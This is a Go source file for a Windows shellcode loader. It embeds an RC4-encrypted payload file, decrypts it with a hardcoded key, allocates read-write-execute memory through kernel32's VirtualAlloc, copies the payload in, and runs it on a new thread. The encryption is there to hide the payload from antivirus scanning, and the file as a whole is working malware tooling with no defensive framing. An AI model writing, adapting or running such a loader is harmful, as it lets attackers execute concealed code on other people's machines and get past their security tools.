// loader.go
package main

import (
	_ "embed"
	"crypto/rc4"
	"fmt"
	"syscall"
	"unsafe"
)

//go:embed loader.bin
var shellcode []byte

var rc4Key = []byte("ThisIs16ByteKey!") // MUST match encryptor.go key

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

func rc4Decrypt(data []byte, key []byte) error {
	c, err := rc4.NewCipher(key)
	if err != nil {
		return err
	}
	c.XORKeyStream(data, data)
	return nil
}

func main() {
	err := rc4Decrypt(shellcode, rc4Key)
	if err != nil {
		fmt.Println("[-] RC4 decryption failed:", err)
		return
	}

	k32, _ := syscall.LoadLibrary("kernel32.dll")
	defer syscall.FreeLibrary(k32)

	virtualAlloc, _ := syscall.GetProcAddress(k32, "VirtualAlloc")
	createThread, _ := syscall.GetProcAddress(k32, "CreateThread")
	waitForSingleObject, _ := syscall.GetProcAddress(k32, "WaitForSingleObject")

	addr, _, _ := syscall.Syscall6(
		uintptr(virtualAlloc),
		4,
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
		0,
		0,
	)

	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
	copy(mem, shellcode)

	thread, _, _ := syscall.Syscall6(
		uintptr(createThread),
		6,
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	syscall.Syscall6(
		uintptr(waitForSingleObject),
		2,
		thread,
		INFINITE,
		0, 0, 0, 0,
	)
}
